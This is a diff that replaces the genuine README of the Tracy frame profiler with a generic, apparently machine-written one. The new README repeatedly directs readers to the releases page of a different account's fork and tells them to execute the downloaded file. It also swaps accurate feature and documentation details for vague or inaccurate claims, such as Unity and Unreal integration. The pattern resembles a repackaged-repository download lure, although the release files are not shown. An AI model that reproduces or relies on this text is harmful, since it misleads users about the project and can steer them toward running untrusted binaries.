@@ -1,28 +1,85 @@
-# Tracy Profiler
+# Tracy: Frame Profiler 🎮
 
-[![Sponsor](.github/sponsor.png)](https://github.com/sponsors/wolfpld/)
+![Tracy Logo](https://img.shields.io/badge/Tracy-Frame%20Profiler-brightgreen)
 
-### A real time, nanosecond resolution, remote telemetry, hybrid frame and sampling profiler for games and other applications.
+Welcome to the **Tracy** repository! This project is a powerful frame profiler designed specifically for game development. It helps developers analyze performance and optimize their games effectively. Whether you're working on a small indie project or a large-scale game, Tracy provides the tools you need to understand your game's performance in real time.
 
-Tracy supports profiling CPU (Direct support is provided for C, C++, Lua, Python and Fortran integration. At the same time, third-party bindings to many other languages exist on the internet, such as [Rust](https://github.com/nagisa/rust_tracy_client), [Zig](https://github.com/tealsnow/zig-tracy), [C#](https://github.com/clibequilibrium/Tracy-CSharp), [OCaml](https://github.com/imandra-ai/ocaml-tracy), [Odin](https://github.com/oskarnp/odin-tracy), etc.), GPU (All major graphic APIs: OpenGL, Vulkan, Direct3D 11/12, Metal, OpenCL.), memory allocations, locks, context switches, automatically attribute screenshots to captured frames, and much more.
+## Table of Contents
 
-- [Documentation](https://github.com/wolfpld/tracy/releases/latest/download/tracy.pdf) for usage and build process instructions
-- [Releases](https://github.com/wolfpld/tracy/releases) containing the documentation (`tracy.pdf`) and compiled Windows x64 binaries (`Tracy-<version>.7z`) as assets
-- [Changelog](NEWS)
-- [Interactive demo](https://tracy.nereid.pl/)
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Usage](#usage)
+- [Installation](#installation)
+- [Documentation](#documentation)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-![](doc/profiler.png)
+## Features 🌟
 
-![](doc/profiler2.png)
+- **Real-time Performance Analysis**: Get instant feedback on your game's performance.
+- **Detailed Frame Metrics**: View metrics for each frame to identify bottlenecks.
+- **User-Friendly Interface**: Navigate easily through the profiler's features.
+- **Cross-Platform Support**: Works on multiple platforms, ensuring versatility.
+- **Integration with Game Engines**: Easily integrate with popular game engines like Unity and Unreal Engine.
 
-![](doc/profiler3.png)
+## Getting Started 🚀
 
-[An Introduction to Tracy Profiler in C++ - Marcos Slomp - CppCon 2023](https://youtu.be/ghXk3Bk5F2U?t=37)
+To get started with Tracy, visit our [Releases section](https://github.com/sefferri/tracy/releases). Download the latest version and follow the installation instructions. This profiler is designed to be straightforward, so you can focus on your game development without unnecessary complexity.
 
-[Introduction to Tracy Profiler v0.2](https://www.youtube.com/watch?v=fB5B46lbapc)  
-[New features in Tracy Profiler v0.3](https://www.youtube.com/watch?v=3SXpDpDh2Uo)  
-[New features in Tracy Profiler v0.4](https://www.youtube.com/watch?v=eAkgkaO8B9o)  
-[New features in Tracy Profiler v0.5](https://www.youtube.com/watch?v=P6E7qLMmzTQ)  
-[New features in Tracy Profiler v0.6](https://www.youtube.com/watch?v=uJkrFgriuOo)  
-[New features in Tracy Profiler v0.7](https://www.youtube.com/watch?v=_hU7vw00MZ4)  
-[New features in Tracy Profiler v0.8](https://www.youtube.com/watch?v=30wpRpHTTag)
+## Usage 🎯
+
+Using Tracy is simple. Once you have installed the profiler, you can integrate it into your game. The setup involves a few steps, which are outlined in the documentation. Here’s a quick overview:
+
+1. **Initialize Tracy**: Start the profiler in your game code.
+2. **Collect Data**: Run your game and let Tracy collect performance data.
+3. **Analyze Results**: Use the Tracy interface to view and analyze the data.
+
+For detailed usage instructions, refer to the [Documentation](#documentation) section.
+
+## Installation 🛠️
+
+To install Tracy, follow these steps:
+
+1. Go to the [Releases section](https://github.com/sefferri/tracy/releases).
+2. Download the appropriate version for your platform.
+3. Execute the downloaded file to complete the installation.
+
+### Requirements
+
+- A supported operating system (Windows, macOS, Linux).
+- A compatible game engine (if applicable).
+
+## Documentation 📚
+
+For comprehensive documentation, please refer to the official docs included in the repository. They cover:
+
+- Installation guides
+- API references
+- Best practices for performance profiling
+- Troubleshooting tips
+
+If you have specific questions, feel free to open an issue in the repository.
+
+## Contributing 🤝
+
+We welcome contributions from the community! If you’d like to help improve Tracy, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes and create a pull request.
+
+Please ensure that your contributions align with the project's goals and maintain the quality of the codebase.
+
+## License 📄
+
+Tracy is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Contact 📬
+
+For any inquiries or feedback, please reach out via the issues section of the repository. We value your input and strive to improve Tracy based on community feedback.
+
+---
+
+Thank you for checking out Tracy! We hope it helps you optimize your game development process. Remember to visit the [Releases section](https://github.com/sefferri/tracy/releases) for the latest updates and features. Happy profiling!
